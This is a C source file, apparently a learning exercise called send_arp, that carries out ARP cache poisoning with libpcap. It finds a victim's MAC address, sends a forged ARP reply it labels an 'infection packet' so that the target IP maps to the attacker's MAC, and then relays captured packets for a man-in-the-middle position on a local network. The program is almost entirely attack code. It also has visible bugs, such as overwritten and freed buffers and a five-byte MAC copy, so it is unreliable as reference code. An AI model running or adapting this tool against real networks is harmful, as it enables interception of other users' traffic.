#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <pcap.h>
#include "headers.h"
#include "initial.h"


int main(int argc, char* argv[])
{
    if (argc != 4)
    {
        printf("USAGE : send_arp <interface> <sender ip> <target ip>\n");
        return -1;
    }
    int i = 0;
    uint8_t tmp;
    char* cp = strtok(argv[2], ".");

    uint8_t attacker_mac[6];
    uint8_t sender_mac[6];
    uint8_t sender_ip[4];
    uint8_t target_ip[4];
    uint8_t broadcast_mac[6];
    uint8_t zero_mac[6] = {0,0,0,0,0,0};
    uint8_t zero_ip[4] = {0,0,0,0};

    struct pcap_pkthdr* header;
    const u_char* packet;
    const u_char* infection_packet;
    char* buf[256];
    int res;
    char *dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];


    for(i = 0; cp; i++)
    {
        tmp = atoi(cp);
        sender_ip[i] = tmp;
        cp = strtok(NULL,".");
    }

    cp = strtok(argv[3], ".");

    for(i = 0; cp; i++)
    {
        tmp = atoi(cp);
        target_ip[i] = tmp;
        cp = strtok(NULL,".");
    }
    //print IP addresses obtained from arguments, which transformed from string to integer type.

    printf("sender_ip = %d.%d.%d.%d\n",sender_ip[0], sender_ip[1], sender_ip[2], sender_ip[3]);
    printf("target_ip = %d.%d.%d.%d\n",target_ip[0], target_ip[1], target_ip[2], target_ip[3]);

    // Get local mac address(attacker's mac address) with get_my_mac function which posted on someone's github. thanks :).

    get_my_mac(attacker_mac, argv[1]);
    printf("my mac = %02x:%02x:%02x:%02x:%02x:%02x\n",attacker_mac[0],attacker_mac[1],attacker_mac[2],attacker_mac[3],attacker_mac[4],attacker_mac[5]);

    //set broadcast_mac

    for(i = 0; i < 6; i++)
    {
        broadcast_mac[i] = 0xff;
    }

    packet = make_arp(REQUEST, attacker_mac, broadcast_mac, attacker_mac, zero_ip, zero_mac, sender_ip);

    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    if (!handle)
    {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    pcap_sendpacket(handle, packet, 42);
    while(true)
    {
        res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        struct ethernet_hdr* eth= (struct ethernet_hdr*)malloc(14);
        eth = (struct ethernet_hdr*)packet;
        struct arp_hdr* arp = (struct arp_hdr*)malloc(28);
        arp = (struct arp_hdr*)(packet + 14);
        if(eth->ether_type == 0x0608 && arp->S_protocol_addr[3] == sender_ip[3])
        {
            for(i = 0; i < 6; i++)
            {
                sender_mac[i] = arp->S_hardware_addr[i];
                printf("sender_mac set clear\n");
            }
            break;
        }
        printf("ip add == %d, %d\n",arp->S_protocol_addr[3], sender_ip[3]);
        printf("type = %04x\nopcode = %d\n",eth->ether_type,arp->Opcode);
        free(eth);
        free(arp);
    }

    infection_packet = make_arp(REPLY, attacker_mac, sender_mac, attacker_mac, target_ip, sender_mac, sender_ip);
    pcap_sendpacket(handle, infection_packet, 42);
    printf("send infection packet!\n");
    while(true)
    {
        res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        struct ethernet_hdr* eth = (struct ethernet_hdr*)malloc(14);
        eth = (struct ethernet_hdr*)packet;
        if(eth->ether_type == 0x0080)
        {
            struct ip_hdr* l3_hdr = (struct ip_hdr*)malloc(20);
            l3_hdr = (struct ip_hdr*)(packet + 14);

            if(l3_hdr->S_ip >> 24 == sender_ip[3])
            {
                for(int i = 0; i < 5; i++)
                {
                    eth->ether_smac[i] = attacker_mac[i];
                }
                pcap_sendpacket(handle, packet, 34);
            }
        }
        else if(eth->ether_type == 0x0608)
        {
            struct arp_hdr* l3_hdr = (struct arp_hdr*)malloc(28);
            l3_hdr = (struct arp_hdr*)(packet + 14);
        }
        else
        {
            continue;
        }





        pcap_sendpacket(handle, packet, 42);
        printf("send infection packet!\n");
    }



    return 0;
}
